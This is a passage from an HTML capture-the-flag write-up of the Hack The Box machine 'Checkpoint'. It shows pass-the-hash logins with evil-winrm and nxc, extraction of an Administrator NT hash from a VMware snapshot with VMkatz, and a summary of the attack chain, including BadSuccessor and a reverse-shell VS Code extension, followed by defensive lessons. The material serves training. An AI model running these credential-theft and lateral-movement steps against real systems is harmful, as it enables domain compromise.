+AES128: [redacted]
+<span class="good">RC4: [redacted]</span>
+
+dMSA previous keys found in TGS (including keys of preceding managed accounts):
+RC4: [redacted]</code></pre>
+    </section>
+
+    <section id="s9">
+      <span class="section-number">09 - Service Account Shell</span>
+      <h2>WinRM as svc_deploy &amp; VMBackups</h2>
+
+      <div class="signal">
+        <span class="signal-label">What pointed us here</span>
+        svc_deploy is in Remote Management Users (WinRM) and BackupAccess (VMBackups). The RC4
+        key from badS4U2self is the NT hash. Pass-the-Hash to evil-winrm gives a shell with
+        access to both.
+      </div>
+
+      <pre><code>evil-winrm -i "$TARGET" -u svc_deploy -H [redacted]
+
+<span class="good">*Evil-WinRM* PS C:\Users\svc_deploy></span></code></pre>
+
+      <pre><code>*Evil-WinRM* PS C:\SHares\VMBackups\NightlyBackup_2024-11-01\memory forensics> dir
+
+Mode     LastWriteTime         Length  Name
+----     -------------         ------  ----
+-a----   5/9/2026  7:45 PM  106496000  Windows Server 2019-000001.vmdk
+-a----   5/9/2026  7:40 PM  2147483648  Windows Server 2019-Snapshot1.vmem
+-a----   5/9/2026  7:40 PM  138164859  Windows Server 2019-Snapshot1.vmsn
+-a----   5/9/2026  7:39 PM     270840  Windows Server 2019.nvram
+-a----   5/9/2026  7:39 PM  10199695360  Windows Server 2019.vmdk</code></pre>
+
+      <p>A nightly VMware backup of a Windows Server 2019 VM including a full memory snapshot
+        (<code>.vmem</code>) and a suspend state file (<code>.vmsn</code>). Both contain a frozen
+        copy of LSASS process memory from the moment of capture.</p>
+    </section>
+
+    <section id="s10">
+      <span class="section-number">10 - Memory Forensics</span>
+      <h2>VM Memory Forensics with VMkatz</h2>
+
+      <div class="signal">
+        <span class="signal-label">What pointed us here</span>
+        VMkatz reads VMware snapshot formats and applies Mimikatz-equivalent LSASS parsing without
+        booting the VM or touching a live system. The <code>.vmsn</code> suspend file is sufficient:
+        it contains the full physical memory state of the guest.
+      </div>
+
+      <div class="theory">
+        <span class="theory-label">VMkatz: LSASS extraction from a VMware snapshot</span>
+        <p>A <code>.vmsn</code> file (VMware suspend state) is a snapshot of the VM's complete physical
+          memory at the moment of suspension. It contains the memory image of all running processes,
+          including <code>lsass.exe</code>, which keeps active session credentials in memory: NT hashes,
+          Kerberos keys, and sometimes cleartext passwords for WDigest sessions.
+        </p>
+        <p>VMkatz locates LSASS structures in the snapshot file, identifies authentication providers
+          (MSV1_0, WDigest, Kerberos, DPAPI) and extracts credentials without starting the VM or
+          contacting a DC. The result is equivalent to running <code>sekurlsa::logonpasswords</code>
+          in Mimikatz on the live machine at the time of suspension.
+        </p>
+      </div>
+
+      <pre><code>*Evil-WinRM* PS C:\Shares\DevDrop> upload vmkatz.exe vmkatz.exe
+
+<span class="good">Info: Upload successful!</span></code></pre>
+
+      <pre><code>*Evil-WinRM* PS C:\Shares\DevDrop> .\vmkatz.exe "C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics"
+
+[*] vmkatz v1.4.5-beta.1
+[*] VMware snapshot: Windows Server 2019-Snapshot1.vmsn
+[*] LSASS: Windows Server 2019-Snapshot1.vmsn
+[*] Providers: MSV(ok) WDigest(ok) Kerberos(ok) TsPkg(empty) DPAPI(ok)
+[*] Credential extraction: 58.1ms
+
+[+] 2 logon session(s), 2 with credentials:
+
+  LUID: 0x3e4 (NETWORK SERVICE)
+  Username: WIN-0DG6SJAEUTA$
+  Domain: WORKGROUP
+  [DPAPI]
+    MasterKey: 15e104f6de4e478c6bf55252632a25b973fccd39...
+
+  LUID: 0x14016d
+  Username: Administrator
+  Domain: WIN-0DG6SJAEUTA
+  LogonServer: WIN-0DG6SJAEUTA
+  LogonTime: 2026-05-09 14:07:14 UTC
+  SID: S-1-5-21-2823729479-30462974-3865623546-500
+  [MSV1_0]
+<span class="good">    NT Hash : [redacted]</span></code></pre>
+
+      <pre><code>nxc winrm "$TARGET" -u Administrator -H [redacted]
+
+WINRM  10.129.21.199  5985  DC01  <span class="good">[+] checkpoint.htb\Administrator:[redacted] (admin)</span></code></pre>
+
+      <p>The local Administrator password on the backup VM matches the domain Administrator. This is a
+        common misconfiguration in environments where VM templates or lab setups share credentials with
+        the hosting domain.</p>
+    </section>
+
+    <section id="s11">
+      <span class="section-number">11 - Domain Admin</span>
+      <h2>Root Flag</h2>
+
+      <pre><code>evil-winrm -i "$TARGET" -u Administrator -H [redacted]
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+<span class="good">[redacted]</span></code></pre>
+
+      <div class="pwned-badge">
+        <div class="pwned-dot"></div>
+        Machine Pwned: Deleted Object → BadSuccessor ×2 → VS Code Supply Chain → VMkatz → Administrator
+      </div>
+    </section>
+
+    <section id="s12">
+      <span class="section-number">12 - Summary</span>
+      <h2>Full Attack Chain</h2>
+
+      <div class="ascii-chain">
+        <pre><code>
+  INITIAL CREDENTIAL
+  ─────────────────────────────────────────────────────────────────────
+  alex.turner:Checkpoint2024!
+  SMB auth succeeds. DevDrop READ only, VMBackups no access
+       │
+       ▼
+  AD ENUMERATION (BloodyAD)
+  ─────────────────────────────────────────────────────────────────────
+  alex.turner → WRITE on deleted mark.davies + CreateChild on OU=Employees
+  ryan.brooks → GenericWrite on svc_deploy
+  svc_deploy  → Remote Management Users + BackupAccess
+       │
+       ▼
+  DELETED OBJECT RESTORATION
+  ─────────────────────────────────────────────────────────────────────
+  Restore mark.davies from Deleted Objects → OU=Employees
+  Remove ACCOUNTDISABLE flag
+  Password reuse: mark.davies:Checkpoint2024! → DevDrop READ,WRITE
+       │
+       ▼
+  BADSUCCESSOR #1: mark.davies (alternative path)
+  ─────────────────────────────────────────────────────────────────────
+  alex.turner creates DMSA markdmsa3$ in OU=Employees
+  alex.turner sets msDS-Superseded* on mark.davies
+  badS4U2self (TGT alex.turner) → mark.davies NT hash
+       │
+       ▼
+  VS CODE EXTENSION SUPPLY CHAIN
+  ─────────────────────────────────────────────────────────────────────
+  Craft malicious .vsix (activationEvents:* → encoded PowerShell reverse shell)
+  Upload checkpoint-shell-1.0.0.vsix to DevDrop as mark.davies (PtH)
+  ryan.brooks opens VS Code → extension activates → reverse shell
+       │
+       ▼
+  RYAN.BROOKS SHELL → user.txt
+  ─────────────────────────────────────────────────────────────────────
+  Shell as ryan.brooks. VMBackups inaccessible (not in BackupAccess)
+       │
+       ▼
+  BADSUCCESSOR #2: svc_deploy
+  ─────────────────────────────────────────────────────────────────────
+  alex.turner creates DMSA svcdmsa$ linked to svc_deploy
+  ryan.brooks shell → PowerShell ADSI → msDS-Superseded* on svc_deploy
+  badS4U2self (TGT alex.turner) → svc_deploy NT hash (RC4)
+       │
+       ▼
+  WINRM + VMBACKUPS
+  ─────────────────────────────────────────────────────────────────────
+  evil-winrm as svc_deploy (Remote Management Users)
+  Access VMBackups via BackupAccess group membership
+  NightlyBackup_2024-11-01: Windows Server 2019 VM snapshot
+       │
+       ▼
+  VMKATZ MEMORY FORENSICS
+  ─────────────────────────────────────────────────────────────────────
+  vmkatz.exe parses Windows Server 2019-Snapshot1.vmsn
+  Extracts Administrator NT hash from LSASS session memory
+       │
+       ▼
+  ADMINISTRATOR → root.txt
+  ─────────────────────────────────────────────────────────────────────
+  Administrator hash valid against DC (VM ↔ domain password reuse)
+  evil-winrm Pass-the-Hash as Administrator
+        </code></pre>
+      </div>
+
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>Phase</th>
+              <th>Technique</th>
+              <th>Signal</th>
+              <th>Result</th>
+            </tr>
+          </thead>
+          <tbody class="chain-table">
+            <tr>
+              <td>01</td>
+              <td>SMB enumeration</td>
+              <td><code>alex.turner</code> → DevDrop READ, extension share comment</td>
+              <td>Extension delivery target identified</td>
+            </tr>
+            <tr>
+              <td>02</td>
+              <td>BloodyAD writable objects</td>
+              <td><code>mark.davies</code> deleted, alex.turner WRITE + CreateChild</td>
+              <td>Deleted object restore vector</td>
+            </tr>
+            <tr>
+              <td>03</td>
+              <td>Deleted object restoration</td>
+              <td>Restore + enable → password reuse</td>
+              <td><code>mark.davies</code> plaintext + DevDrop WRITE</td>
+            </tr>
+            <tr>
+              <td>04</td>
+              <td>BadSuccessor #1</td>
+              <td>dMSA markdmsa3$ → S4U2self</td>
+              <td><code>mark.davies</code> NT hash</td>
+            </tr>
+            <tr>
+              <td>05</td>
+              <td>VS Code supply chain</td>
+              <td>Malicious .vsix planted in DevDrop</td>
+              <td>Reverse shell as <code>ryan.brooks</code></td>
+            </tr>
+            <tr>
+              <td>06</td>
+              <td>User flag</td>
+              <td>Shell context = ryan.brooks</td>
+              <td>user.txt</td>
+            </tr>
+            <tr>
+              <td>07</td>
+              <td>BadSuccessor #2</td>
+              <td>dMSA svcdmsa$ + ryan.brooks ADSI write on svc_deploy</td>
+              <td><code>svc_deploy</code> NT hash</td>
+            </tr>
+            <tr>
+              <td>08</td>
+              <td>WinRM (PtH)</td>
+              <td><code>svc_deploy</code> ∈ Remote Management Users + BackupAccess</td>
+              <td>Shell + access to VMBackups share</td>
+            </tr>
+            <tr>
+              <td>09</td>
+              <td>VM memory forensics</td>
+              <td>VMkatz on <code>.vmsn</code> snapshot</td>
+              <td>Administrator NT hash</td>
+            </tr>
+            <tr>
+              <td>10</td>
+              <td>WinRM (PtH)</td>
+              <td>Password reuse: VM local admin = domain Administrator</td>
+              <td>Domain Admin, root.txt</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <section id="s13">
+      <span class="section-number">13 - Lessons</span>
+      <h2>Key Takeaways</h2>
+
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>Concept</th>
+              <th>Lesson</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Deleted Objects</td>
+              <td>AD's Recycle Bin preserves most attributes including ACL entries. A writable
+                deleted object is an account waiting to be re-enabled. Check group memberships
+                and ACLs on tombstoned objects. The permissions survive deletion.</td>
+            </tr>
+            <tr>
+              <td>Password reuse</td>
+              <td>Restored accounts often retain their last password. Test the initial credential
+                against re-enabled accounts before attempting more complex attacks like ASREP
+                roasting or BadSuccessor.</td>
+            </tr>
+            <tr>
+              <td>BadSuccessor (Windows Server 2025)</td>
+              <td>CreateChild on an OU plus WRITE on a target account is enough to extract NT
+                hashes without password changes or interaction with the target. Requires all four
+                succession attributes set correctly on both the dMSA and the target object.</td>
+            </tr>
+            <tr>
+              <td>Two-actor BadSuccessor</td>
+              <td>The dMSA creator and the account with WRITE on the target do not need to be
+                the same principal. alex.turner created the dMSA; ryan.brooks' shell wrote the
+                succession attributes on svc_deploy. Splitting the operation across two accounts
+                is a realistic scenario.</td>
+            </tr>
+            <tr>
+              <td>VS Code extension supply chain</td>
+              <td>A writable internal extension repository is equivalent to code execution on every
+                developer workstation that loads extensions from it. <code>activationEvents: ["*"]</code>
+                fires immediately on VS Code startup with no user interaction required beyond opening
+                the editor.</td>
+            </tr>
+            <tr>
+              <td>VM snapshot forensics</td>
+              <td>Backup shares containing live VMware snapshots are high-value targets. VMkatz
+                extracts LSASS credentials from <code>.vmsn</code> files without booting the VM.
+                A single nightly backup can expose credentials for an entire environment.</td>
+            </tr>
+            <tr>
+              <td>BackupAccess group</td>
+              <td>Service accounts tied to backup infrastructure tend to accumulate permissions that
+                span the entire environment. The group name in LDAP directly communicated the path
+                to the VMBackups data.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="pwned-badge">
+        <div class="pwned-dot"></div>
+        Machine Pwned: Deleted Object Restore → BadSuccessor ×2 → VS Code Supply Chain → VMkatz → Administrator
+      </div>
+    </section>
+
+  </div>
+
+  <footer>
+    © 2026 &nbsp;·&nbsp; HTB Checkpoint Writeup &nbsp;·&nbsp; Windows Server 2025 / Active Directory / BadSuccessor
+  </footer>
+
+</body>
+
+</html>
